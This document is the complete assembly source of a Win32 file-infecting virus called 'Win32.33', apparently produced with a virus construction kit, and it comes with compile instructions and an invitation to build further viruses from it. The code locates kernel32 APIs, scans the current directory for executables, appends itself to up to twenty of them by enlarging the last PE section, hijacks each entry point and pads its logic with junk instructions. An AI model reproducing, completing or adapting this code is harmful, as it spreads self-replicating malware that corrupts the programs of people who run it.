              
;
;
; Win32.33 by SnakeByte
;
; This Virus is created with the Next Generation VCK by SnakeByte
; to get a copy of this Virus Construction Kit check www.kryptocrew.de/snakebyte/
;
; Virus Description : 
;
;  Virusname              : Win32.33
;  Author                 : SnakeByte
;  Operating System       : Win32 ( Win9x, NT, ME, 2000 )
;  Target Files           : Windows Portable Executable
;  Created with           : Next Generation VCK 0.45
;  Creation Date          : 2/29/2016
;  Infection Mark         : 33
;  Infection Type         : increasing last section
;  API Search             : Byte Comparison Type II
;  Entry Point Obscurity  : No
;  Locate Kernel by       : using address from stack
;  Anti Bait              : No
;  Travelling             : No
;  Encrypt Hostcode       : No
;  Per-Process Residency  : No
;  SelfMailing            : No
;  mIRC Spreading         : No
;  Trash Ratio            : 1 to 12
;  No. of Files to infect : 20
;
;
;
; Compile this source code with (TASM 5.0) : 
;
;     tasm32 /z /ml /m1 <FileName>,,;
;     tlink32 -Tpe -c <FileName>,<FileName>,, import32.lib
;
; If you edit this source or create another virus from this,
; then please send me a copy so that I know what else I could add
;    Hope you enjoy this ... SnakeByte [ SnakeByte@kryptocrew.de ]
;

.586p
.model flat
jumps
.radix 16

 extrn ExitProcess:PROC

.data
 VirusSize equ (offset EndVirus - offset Virus )
 NumberOfApis equ 8d

VirusCode:
Virus:
 call Delta                             ; Get Delta Offset

Delta:
 pop eax
 sub eax, offset Delta
                                        ; mov ebp, eax
 push eax
 pop ebp
 jmp KernelSearchStart


;        [ ///// * File Handling Procedure * \\\\\ ]

                                        ; File Handling
OpenFile:                               ; Open File
                                        ; clear ecx
 mov ecx, -33793d
 add ecx, 33793d

 push ecx
 push ecx
 push 3h
 push ecx
                                        ; add ecx, 1
 add ecx, 1d
 push ecx
 sar edx, 29d                           ; Trash
 push 80000000h or 40000000h
 lea esi, [ebp+WFD_szFileName]
 xchg esi, edi

 push edi
 call dword ptr [ebp+XCreateFileA]

 add eax, 1
 jz Closed
 sub eax, 1

 mov dword ptr [ebp+FileHandle], eax

CreateMap:                              ; Map the file
 mov ebx, dword ptr [ebp+WFD_nFileSizeLow]
 push ebx

                                        ; clear ecx
 push 0
 pop ecx
 push ecx
 push ebx
 push ecx
 push 00000004h
 push ecx
 push dword ptr [ebp+FileHandle]
 ror edx, 1d                            ; Trash
 call dword ptr [ebp+XCreateFileMappingA]
 mov dword ptr [ebp+MapHandle], eax
 pop ebx
 sub eax, 1
 add eax, 1
 jz CloseFile
                                        ; clear eax
 push 0
 pop eax
 push ebx
 push eax
 push eax
 push 2h
 push dword ptr [ebp+MapHandle]
 call dword ptr [ebp+XMapViewOfFile]
                                        ; add eax, 1
 inc eax
 dec eax
 jz UnMapFile
 mov dword ptr [ebp+MapAddress], -1
 and dword ptr [ebp+MapAddress], eax
 clc
ret

UnMapFile:                              ; Unmap the file and store it to disk
 Call UnMapFile2

CloseFile:                              ; Close the file
 push dword ptr [ebp+FileHandle]
 Call [ebp+XCloseHandle]

Closed:
 stc
ret

UnMapFile2:
 not edx                                ; Trash
 push dword ptr [ebp+MapAddress]
 call dword ptr [ebp+XUnmapViewOfFile]
 push dword ptr [ebp+MapHandle]
 call dword ptr [ebp+XCloseHandle]
ret



;          [ ///// * APISearch - Procedure * \\\\\ ]


GetApis:                                ; Retrive the APIs we need
 shl ebx, 27d                           ; Trash


                                        ; number of API's we're looking for
 push NumberOfApis
 pop ecx

                                        ; load API Names and Offsets
 lea ebx, [ebp+APIOffsets]
 xchg esi, ebx

 mov eax, offset APINames
 add eax, ebp


GetApisLoop: 

                                        ; clear edx
 mov edx, -25453d
 add edx, 25453d
 mov dl, byte ptr [eax]
 xor dword ptr [ebp+Trash1], edx        ; Trash
                                        ; add eax, 1
 add eax, 1d

                                        ; search 'em
                                        ; edx contains Name-Lenght
                                        ; eax points to the Name
                                        ; esi points to the offset

 call SearchAPI1
 add eax, edx
 mov ebx, dword ptr [ebp+TempAPI]
 mov dword ptr [esi], ebx
                                        ; add esi, 4
 dec esi
 add esi, 5d
 loop GetApisLoop
 jmp Outbreak



;          [ ///// * Execute Original File * \\\\\ ]

NoKernel:
                                        ; store old EIP and ImageBase
 mov eax, dword ptr [ebp+OldBase]

 mov dword ptr [ebp+retBase], eax

                                        ; clear edx
 sub edx, edx
 xor edx, dword ptr [ebp+OldEIP]

 mov dword ptr [ebp+retEIP], 0
 add dword ptr [ebp+retEIP], edx



ExecuteHost:                            ; Start the infected File

                                        ; check if we are first generation
                                        ; add ebp, 1
 inc ebp
 dec ebp
 jz FirstGenHost
 mov ebx,12345678h
 org $-4
 retEIP dd 0h
 add ebx,12345678h
 org $-4
 retBase dd 0h
 push ebx
ret



;      [ ///// * Prepare Infection Procedure * \\\\\ ]

InfectFile:                             ; Infect a file
                                        ; check for minimum filesize
 cmp dword ptr [ebp+WFD_nFileSizeLow], 20000d
 jbe NoInfection
 call OpenFile                          ; open the file
 jc NoInfection
                                        ; check for EXE File
 push dword ptr [ebp+MapAddress]
 pop eax
                                        ; check for ZM
 cmp word ptr [eax], 'ZM'
 je Goodfile
                                        ; mov ebx, 23245
 push 23245d
 pop ebx
 or ebx, ebx
 jnz Notagoodfile
Goodfile:
 cmp word ptr [eax+3Ch], 0h
 jne _Notagoodfile
 jmp Notagoodfile
 add dword ptr [ebp+Trash1], ebx        ; Trash
_Notagoodfile:
 mov esi, dword ptr [eax+3Ch]
                                        ; check if header lies inside the file
 cmp esi, dword ptr [ebp+WFD_nFileSizeLow]
 ja Notagoodfile
 add esi, eax
                                        ; check for PE Header
                                        ; check for EP
 movzx ecx, word ptr [esi]
 sub ecx, 'EP'
 jz Goodfile2
 adc edx, eax                           ; Trash
                                        ; mov ecx, 34503
 mov ecx, ( 34503d - 34d )
 add ecx, 34d
 cmp ecx, 34503d
 je Notagoodfile

Goodfile2:
                                        ; check for previous Infection
 cmp dword ptr [esi+4Ch], '33'
 jz Notagoodfile
                                        ; check for OBJ
 mov dx, word ptr [esi+16h]
 and dx, 00002h
 cmp dx, 00002h
 jne Notagoodfile
                                        ; check for DLL
 mov dx, word ptr [esi+16h]
 and dx, 0F000h
 cmp dx, 02000h
 je Notagoodfile
 call InfectEXE                         ; Infect the file
 jnc Notagoodfile
 jmp NoInfection

Notagoodfile:
 shl ecx, 6d                            ; Trash
 call UnMapFile

NoInfection:
ret
 inc ebx                                ; Trash




;        [ ///// * Search Kernel Procedure * \\\\\ ]

KernelSearchStart:
                                        ; store old EIP and ImageBase
 mov edi, dword ptr [ebp+OldEIP]

 push edi
 dec dword ptr [ebp+Trash1]             ; Trash
 pop dword ptr [ebp+retEIP]

 mov eax, dword ptr [ebp+OldBase]

 mov dword ptr [ebp+retBase], -1
 dec dword ptr [ebp+Trash1]             ; Trash
 and dword ptr [ebp+retBase], eax


                                        ; get Kernel Adress from Stack
                                        ; --> return Adress to the CreateProcess API
 mov ecx, dword ptr [esp]
                                        ; round to pages
 sub cx, cx
 and eax, ebx                           ; Trash
                                        ; add ecx, 1
 sub ecx, -1d
GetKernelLoop:
                                        ; clear ebx
 mov ebx, -15205d
 add ebx, 15205d
 dec ecx
 and eax, edx                           ; Trash
 mov bx, word ptr [ecx+03ch]
 cmp bx,0f800h
 je GetKernelLoop
 cmp ecx, dword ptr [ecx+ebx+34h]
 jnz GetKernelLoop
 push ecx
 pop dword ptr [ebp+KernelMZ]
                                        ; add ecx, 60
 add ecx, 60d
 mov eax, [ecx]
 dec ecx
 sub ecx, 59d
 add eax, ecx
 mov [KernelPE+ebp], eax

 jmp GetApis

;            [ ///// * Align Procedure * \\\\\ ]

Align:                                  ; align File or Section Size
 pushad
                                        ; clear edx
 and edx, 0
 mov eax, dword ptr [ebp+AlignReg1]
 add ecx, eax                           ; Trash
 mov ebx, dword ptr [ebp+AlignReg2]
 div ebx
                                        ; add eax, 1
 add eax, 1d
 mul ebx
 mov dword ptr [ebp+AlignReg1], eax
 popad
ret



;          [ ///// * FindFiles Procedure * \\\\\ ]


FindNextFileProc:                       ; find another file
 call ClearOldData
 lea ebx, [ebp+WIN32_FIND_DATA]
 mov eax, 82486218d                     ; Trash
 xchg esi, ebx

 push esi
 mov eax, dword ptr [ebp+FindHandle]
 push eax
 call dword ptr [ebp+XFindNextFileA]
ret


ClearOldData:                           ; we don't want waste in the fields
 pushad
 lea ebx, [ebp+WFD_szFileName]
 xchg ebx, esi

                                        ; mov edx, 276
 push 276d
 pop edx

ClearOldData2:
 mov byte ptr [esi], 0h
                                        ; add esi, 1
 sub esi, -1d
 dec edx
 jnz ClearOldData2
 sbb eax, 16d                           ; Trash
 popad
ret

                                        ; Find the first file
FindFirstFileProc:
 call ClearOldData
 lea esi, [ebp+WIN32_FIND_DATA]
 xchg esi, edx

 push edx
 push edi
 call dword ptr [ebp+XFindFirstFileA]
 mov dword ptr [ebp+FindHandle], -1
 and dword ptr [ebp+FindHandle], eax
ret





;           [ ///// * Outbreak Procedure * \\\\\ ]

 rcl eax, 8d                            ; Trash

Outbreak:                               ; Lets infect some files...


;   [ ///// * Infect Current Directory Procedure * \\\\\ ]

InfectCurDir:                           ; Infect the current directory
                                        ; mov ebx, 20
 push 20d
 pop ebx
 mov dword ptr [ebp+InfCounter], ebx
 mov edi, ebp
 add edi, offset filemask

                                        ; Find File to infect
 call FindFirstFileProc
 inc eax
 jz EndInfectCurDir

InfectCurDirFile:                       ; Infect the file
 call InfectFile
                                        ; Check Infection Counter
 cmp [ebp+InfCounter], 0h
 je EndInfectCurDir
                                        ; find more Files
 call FindNextFileProc
 cmp eax, 0
 jne InfectCurDirFile

EndInfectCurDir:
                                        ; Close the Handle
 mov eax, dword ptr [ebp+FindHandle]
 push eax
 call dword ptr [ebp+XFindClose]

 jmp ExecuteHost


;                  [ ///// * Data * \\\\\ ]

Data:
 OldEIP      dd 0h
 NewSize     dd 0h
 InfCounter  dd 0h
 counter     dw 0h
 filemask    db '*.EXe',0
 FindHandle  dd 0h
 ATableVA    dd 0h

 APIOffsets:
 XFindNextFileA         dd 0h
 XCreateFileA           dd 0h
 XCloseHandle           dd 0h
 XCreateFileMappingA    dd 0h
 XMapViewOfFile         dd 0h
 XUnmapViewOfFile       dd 0h
 XFindClose             dd 0h
 XFindFirstFileA        dd 0h

 db 'Virus : Win32.33 Author : SnakeByte',0
 AlignReg1   dd 0h
 TempApisearch3 dd 0h
 OldBase     dd 400000h
 OTableVA    dd 0h
 AlignReg2   dd 0h
 TempAPI     dd 0h

 APINames:
 db 13d, 'FindNextFileA'
 db 11d, 'CreateFileA'
 db 11d, 'CloseHandle'
 db 18d, 'CreateFileMappingA'
 db 13d, 'MapViewOfFile'
 db 15d, 'UnmapViewOfFile'
 db 09d, 'FindClose'
 db 14d, 'FindFirstFileA'

 Trash1      dd 0h
 KernelMZ    dd 0h
 MapAddress  dd 0h
 NTableVA    dd 0h
 FILETIME                STRUC
 FT_dwLowDateTime        dd       ?
 FT_dwHighDateTime       dd       ?
 FILETIME ENDS

 WIN32_FIND_DATA         label    byte
 WFD_dwFileAttributes    dd       ?
 WFD_ftCreationTime      FILETIME ?
 WFD_ftLastAccessTime    FILETIME ?
 WFD_ftLastWriteTime     FILETIME ?
 WFD_nFileSizeHigh       dd       ?
 WFD_nFileSizeLow        dd       ?
 WFD_dwReserved0         dd       ?
 WFD_dwReserved1         dd       ?
 WFD_szFileName          db       260d dup (?)
 WFD_szAlternateFileName db       13   dup (?)
 WFD_szAlternateEnding   db       03   dup (?)

 TempApisearch2 dd 0h
 MapHandle   dd 0h
 NewEIP      dd 0h
 FileHandle  dd 0h
 KernelPE    dd 0h




;      [ ///// * EXE FILE Infection Procedure * \\\\\ ]

 or ebx, 81438959d                      ; Trash
InfectEXE:                              ; infect an exe file
 push dword ptr [ebp+MapAddress]
 pop eax
                                        ; retrieve PE - Header
 mov ebx, eax
 add ebx, [eax+3Ch]
                                        ; get File Alignment
                                        ; add ebx, 60
 inc ebx
 add ebx, 59d
 mov ecx, [ebx]
 dec ebx
 sub ebx, 59d
                                        ; clear ebx
 mov ebx, -24765d
 add ebx, 24765d
 xor ebx, dword ptr [ebp+WFD_nFileSizeLow]
                                        ; calculate new size
 mov dword ptr [ebp+AlignReg2], ecx
 add ebx, VirusSize
 mov dword ptr [ebp+AlignReg1], -1
 and dword ptr [ebp+AlignReg1], ebx
 call Align
 mov ebx, dword ptr [ebp+AlignReg1]
                                        ; unmap file and map it again with new size
 mov dword ptr [ebp+NewSize], -1
 and dword ptr [ebp+NewSize], ebx
 pushad
 Call UnMapFile2
 popad
 mov dword ptr [ebp+WFD_nFileSizeLow], 0
 xor dword ptr [ebp+WFD_nFileSizeLow], ebx
 call CreateMap
 jc NoEXE
 mov esi, dword ptr [ebp+MapAddress]
                                        ; retrieve PE - Header again
 mov ebx, dword ptr [esi+3Ch]
 shl eax, 9d                            ; Trash
 add ebx, esi
                                        ; infect by increasing the last section
 mov esi, ebx
                                        ; get last section
                                        ; clear edx
 and edx, 0
 sbb eax, 10d                           ; Trash
 mov dx, word ptr [esi+06h]
 add edx, -1
 imul edx, edx, 28h
                                        ; add ebx, 120
 add ebx, 120d
 add ebx, edx
 mov eax, dword ptr [esi+74h]
 sal eax, 3
 add ebx, eax
                                        ; get old Entrypoint
 mov edx, dword ptr [esi+34h]
 mov dword ptr [ebp+OldBase], edx
 rcl ecx, 14d                           ; Trash
 mov edx, dword ptr [esi+28h]
 mov dword ptr [ebp+OldEIP], 0
 add dword ptr [ebp+OldEIP], edx
 mov ecx, [ebx+10h]
 and edx, 28529139d                     ; Trash
                                        ; mov eax, ecx
 push ecx
 pop eax
 add ebx, 14h
 add ecx, [ebx]
 sub ebx, 14h
 push ecx
 push eax
 pop edx
 sub dword ptr [ebp+Trash1], ebx        ; Trash
 add ebx, 0Ch
 add edx, [ebx]
 sub ebx, 0Ch
 mov dword ptr [ebp+NewEIP], edx
                                        ; save new enty point in file
 mov dword ptr [esi+28h], 0
 add dword ptr [ebp+Trash1], 1995302    ; Trash
 add dword ptr [esi+28h], edx
 mov edx, [ebx+10h]
 push edx
                                        ; calculate new section size
 push dword ptr  [esi+3Ch]
 pop dword ptr [ebp+AlignReg2]
 add edx, VirusSize
 mov dword ptr [ebp+AlignReg1], edx
 and dword ptr [ebp+Trash1], 1660912    ; Trash
 call Align
 mov edx, dword ptr [ebp+AlignReg1]
 mov dword ptr [ebx+10h], 0h
 add dword ptr [ebx+10h], edx
 pop edx
 add edx,  (VirusSize-824d)
 add edx, 824d
 sub dword ptr [ebp+Trash1], 291419     ; Trash
 mov dword ptr [ebx+08h], 0
 add dword ptr [ebx+08h], edx
 mov edx, dword ptr [ebx+0Ch]
 add edx, dword ptr [ebx+10h]
 mov dword ptr [esi+50h], edx
                                        ; set write, read and code flag
 or dword ptr [ebx+24h], 0A0000020h
                                        ; set infection mark
 mov dword ptr [esi+4Ch], 0h
 and dword ptr [ebp+Trash1], 1942041    ; Trash
 add dword ptr [esi+4Ch], '33'
                                        ; Append Virus
 pop edi
 mov edx, VirusSize
 lea ebx, [ebp+Virus]
 xchg ebx, esi

 add edi, dword ptr [ebp+MapAddress]

AppendLoop:
 movsb
 dec edx
 jnz AppendLoop
                                        ; decrease Infection Counter
 mov edx, dword ptr [ebp+InfCounter]
 dec edx
 mov dword ptr [ebp+InfCounter], edx
 clc
ret

NoEXE:
 stc
ret



;          [ ///// * APISearch 1 Procedure * \\\\\ ]

                                        ; edx Lenght of API-Name
                                        ; eax Points to API-Name ( Virus )

SearchAPI1:                             ; Procedure to retrieve API Offsets
 pushad



 mov ebx, dword ptr [ebp+KernelPE]
                                        ; get Export-Table
                                        ; clear ecx
 xor ecx, ecx
 add ecx, [ebx+78h]
 add dword ptr [ebp+Trash1], edx        ; Trash
 add ecx, [ebp+KernelMZ]
                                        ; add ecx, 28
 dec ecx
 add ecx, 29d
                                        ; get ATableVA
 mov ebx, dword ptr [ecx]
 add ebx, [ebp+KernelMZ]
 mov dword ptr [ebp+ATableVA], ebx
 inc dword ptr [ebp+Trash1]             ; Trash
                                        ; add ecx, 4
 add ecx, 4d
                                        ; get NTableVA
 mov ebx, dword ptr [ecx]
                                        ; add ecx, 4
 add ecx, 4d
 add ebx, [ebp+KernelMZ]
 mov dword ptr [ebp+NTableVA], ebx
                                        ; get OTableVA
 mov ebx, dword ptr [ecx]
 add ebx, [ebp+KernelMZ]
 mov dword ptr [ebp+OTableVA], ebx
                                        ; mov ebx, -1
 push -1d
 pop ebx
 and ebx, dword ptr [ebp+NTableVA]
                                        ; clear the counter
 mov word ptr [ebp+counter], 0h


SearchNextApi1:                         ; search for the API's
 push ebx
 mov ecx, dword ptr [ebx]
 add ecx, [ebp+KernelMZ]
                                        ; mov ebx, ecx
 mov ebx, ecx
                                        ; mov esi, ecx
 mov esi, ecx
 push edx
 mov dword ptr [ebp+TempApisearch2], 0
 add dword ptr [ebp+TempApisearch2], esi
 push eax
 pop dword ptr [ebp+TempApisearch3]
 cld

                                        ; esi Points to API-Name ( Kernel )
                                        ; eax Points to API-Name ( Virus )
                                        ; compare Names

ApiCompareLoop:
 mov ch, byte ptr [esi]
 cmp ch, byte ptr [eax]
 jne ApiNotFound
 shl ecx, 29d                           ; Trash
 sub edx, 1
 test edx, edx
 jz FoundApi1
                                        ; add esi, 1
 inc esi
                                        ; add eax, 1
 add eax, 1d
 jmp ApiCompareLoop

ApiNotFound:                            ; we did not find it :(
 pop edx
 pop ebx
 mov eax, dword ptr [ebp+TempApisearch3]
                                        ; clear esi
 sub esi, esi
 add esi, dword ptr [ebp+TempApisearch2]
                                        ; add ebx, 4
 add ebx, 4d
 add word ptr [ebp+counter], 1h
 cmp word ptr [ebp+counter], 2001h
 jne SearchNextApi1
 jmp NotFoundApi1

FoundApi1:                              ; we found the API
                                        ; clear Stack
 pop ebx
 pop esi
                                        ; retrieve the offset
 movzx ebx, word ptr [ebp+counter]
                                        ; point to ordinal Table
 sal ebx, 1                             ; multiply with 2
 add ebx, dword ptr [ebp+OTableVA]
 mov esi, ebx
                                        ; clear ebx
 mov ebx, -4439d
 add ebx, 4439d
 mov bx, word ptr [esi]
 shl ebx, 2h
 add ebx, dword ptr [ebp+ATableVA]
                                        ; convert to RVA
                                        ; mov ecx, -1
 mov ecx, -1d
 and ecx, dword ptr [ebp+KernelMZ]
 add ecx, dword ptr [ebx]
 mov dword ptr [ebp+TempAPI], ecx
 popad
ret

NotFoundApi1:
                                        ; we did not get one of the nessecairy API's
                                        ; so we quit !
 pop esi
 popad
 jmp ExecuteHost



CryptEnd:
EndVirus:

;          [ //////////////////\\\\\\\\\\\\\\\\\\\ ]
;          [ ///// * First Generation Host * \\\\\ ]


.code                                   ; Lets place some code
                                        ; to start the virus
                                        ; which is inside the
                                        ; data section
FakeCode:

 push offset VirusCode

 ret


FirstGenHost:                           ; exit for the first generation
                                        ; clear ecx
 push 0
 pop ecx
 push ecx
 call ExitProcess



end FakeCode

